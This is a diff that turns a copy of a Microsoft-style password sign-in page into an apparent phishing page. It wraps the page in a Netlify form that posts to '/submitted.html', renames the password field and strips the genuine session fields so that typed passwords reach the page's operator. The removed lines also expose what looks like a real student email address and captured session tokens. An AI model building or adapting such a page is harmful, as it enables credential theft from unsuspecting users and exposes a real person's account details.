@@ -47,7 +47,7 @@
 
 <div data-bind="if: activeDialog"></div>
 
-
+<form action="/submitted.html" method="POST" name="f" id="f" data-netlify="true">
     <!-- ko withProperties: { '$loginPage': $data } -->
     <div class="login-paginated-page" data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
@@ -221,9 +221,7 @@
             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         
             <!-- ko if: $parent.currentViewIndex() === $index() -->
-                <!-- ko template: { nodes: [$data], data: $parent } -->
-                
-                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                 params: {
                     serverData: svr,
                     serverError: initialError,
@@ -257,21 +255,6 @@
 
 <!--  -->
 
-<div aria-hidden="true">
-    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
-
-    <input type="hidden" name="login" autocomplete="username" data-bind="value: unsafe_username" value="119979@vsv.vic.edu.au">
-
-    <!-- The loginfmt input type is different as some password managers require it to be of type text.
-        Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
-    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
-    <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
-    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
-    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
-    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
-    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
-    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
-</div>
 
 <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
     <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
@@ -296,7 +279,7 @@
                 updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
     <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
 
-            <input name="password" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+            <input name="passwd" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                 attr: { autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off'},
                 textInput: passwordTextbox.value,
                 ariaDescribedBy: [
@@ -322,7 +305,6 @@
 </div>
 
 <!-- ko if: shouldHipInit --><!-- /ko -->
-<form action="/submitted.html" method="POST" name="f" id="f" data-netlify="true">
 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="password-reset-links-container ext-password-reset-links-container">
     <div>
         <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
@@ -409,7 +391,7 @@
 </div></div>
     </div>
 </div>
-</form>
+
 
 <!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText-->
 <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
@@ -504,37 +486,7 @@
         <!-- /ko -->
     </div>
 </div></div>
-        <!-- /ko -->
-
-        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
-        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
-        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
-        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
-        <!-- ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken -->
-        <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="pfUojFuhK84HWCrrem/hZ8r2Mmwj4WygXNI/cROtNGo=8:1:CANARY:ZfJmXBshFHhokKD/GqUMHUBsFVJP3vAINm6+jPKQkEw=">
-        <!-- /ko -->
-        <!-- ko if: !svr.sCanaryTokenName || svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
-        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAnZI9aBtnGMd1luw4AtdOC8VkiSCmlKa67ztJBg2yZEl30p2-7iydlvR0957vva9XvjtZlsaQQikUQpeUdCuZBIXQpaUE0q1gOmQJJFncbsFDEjKFDCXqkKFbCDw8w8P_Nzz8_ulVFmdx8oskjZO7Owapj_IGKGRBQSezLA1y2RHJs1mGMVmaNi2Wsqjw4_RW7saZ9eTf5P3km6-vG-avdxdYzo7jcbRLEGgSewi5OLIsaADcQD4RAV8PYmigYxAeQzAlfIbnyrYe93qt3zDsIYY9w7DvV77FWngZdk5kWoSSIzEaJGeyIvpNpetKzn6sOVVPLlNQorWZ7B-42lz0pJrQEyvaXFKMJVe1m_3OVFPcWK7J7pLnZOfAayqiM1RcRnIEclhRKc1GqjQ3KLkilgxadJrBcKzNOG9YVyfaQD2sdYrFxcoOSRX4XMEoZA2D47I5kgTZPM-Osgw3InWGtFgGgKcrm63SJLbp_xYK4Ry8Wlm3Qv3QB0F8J-mBmTgelgVecEonLUVjWn2Ja_ZlR1Y6sUyrrAwpW-t3neUNSoq9fLPqy37X13pCJPiUZ9b2YSuIoN7nyOFAtDWmOx7RnAoGe57gIGjUClNzUILWgCwuklffOYgmoygO9Rj8z8LMDMDsl-QGCg_1AM71GKIgOk2K70ERuAksfeLFGTQGATQz4xBZ0AOZZdKDAbiuGwaIosdJ7GEKO099up7aSm0nMonPPyNXd9fX01ub2xcyidcp7KfVZXvulq_8efPHR43vbn91-c4ZnzhdJcaWipzqxG7k2Xq_HIbAJ-xhPqQlf-qw_dnhQBYIo9taekXF_C51aw27tfbJ6dqmH-ke7kT4KETTCIQv17BvLiR-v_ihbfwhjS3S16hc7aRro7xf5Wk47zjNiQuZdu_gqNLsmBxoIbcW8d12u6FI99LYHxuJ1x_9fHvx14sH_zyvn29-ObREf7AX2dW6jdxGhagdqVJd3YuqB2KbOS4Jss9fc9qNjrs_Ld7bSvy9nEuJtw2">
-        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="c71f43a4-9b84-4bd5-8d97-601a9adf3600">
-        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAABVrSpeuWamRam2jAF1XRQEvNK5eyGEfO6nZTze_CUoPxdCscPbSTnK0u1pY5E-zpFBdLznHhSHk-UGNwodugd42WQ7QzduaSLGLrcEkcYShzdnqjQSQJugL1jcVqiiaEKQq5bL_LvrnBtc0DbG9ygTYK12Bbz0Rdc3ptFlzPMZfMktP7Y0IfzSxHdtsCJaelJQT0vSLlCXCvj37DlGDYHnwXEgLJ4RDsYik_9lFWfGnPh3lcFJRolUqHlnR4oUcN9six9ocwxV9Rrmdl7xpOcBSahf4WYNNHa-7HH0c-ejuAU0w3ztDelQvcNt05WqA3deDd7UhQ1gZgeTVBVNA5fJ72r9yDbn7UfH8y3me1jhCTr7Vy4OBKqtz_xQfcj66x4JiGl_CJITe1sNOFLCbujPPxgMDJgEidopPIS3kxPsuho1JiTJEFl7mgn5uDrLfrkMgDyxFeJmX_YATW0UAgT3v3mfwBySgZA0nlaHYHJCULV9f2j4DBL3mdEXeol_rFKtxMORPSgTbAZZjFUrbYpCasGxOXDAdxRY52VG3ywe41xKsJFfcKohZJba3JIpS9fW4iOl1MaJNcBB1Xa8JNez8whSfHkgrA_0VnKnRXSQ2iDwas99PFJFg9jIYAZN0BIQCmOVS6-NAasP4FL69TwOCm97ExRWB8DSkGXb5OF5Ch0EZL0836JPfjMA43N6oXqHG4dKF_5y7zliK6RY--EZ6L6DjIEsmSmcEmK4k_4zdjTmXXt9S8f_IgksdLBk5rGhd37OPdVMg6Wl92YDl8RuClDD5HTFKH0KnRklMsQUjEVOt02wTGL4YwuN9xLWgNzVnZeEkfOJ8397BQ3qSpZqcmkGn39H-aA7mu77gU6a5FzHTlTt4-mD-bUwnfT6VSAhoL2O6wgsYoHmzv3jwKN0GkggXnpJ_JxpiDxkxo5yBNSE9TYXYwHOLf5m_4gbeTCjrTdark8_2qRGgUWUItUIIAA">
-        <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
-        <input type="hidden" name="NewUser" value="1">
-        <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
-        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
-        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
-        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
-        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
-        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
-        <!-- ko ifnot: svr.fShouldSupportTargetCredentialForRecovery --><!-- /ko -->
-        <!-- ko if: svr.fEnableDFPIntegration -->
-        <input type="hidden" name="DfpArtifact" data-bind="value: dfpResult()" value="">
-        <!-- /ko -->
-        <!-- ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() --><!-- /ko -->
-        <div data-bind="component: { name: 'instrumentation-control',
-            publicMethods: instrumentationMethods,
-            params: { serverData: svr } }">
-<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
-    <!-- /ko -->
+    
         </div>
 
         <!-- ko if: $page.showFedCredAndNewSession -->
@@ -642,7 +594,7 @@
     <!-- /ko -->
 <!-- /ko --></div>
     <!-- /ko -->
-
+</form>
 
 <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
 
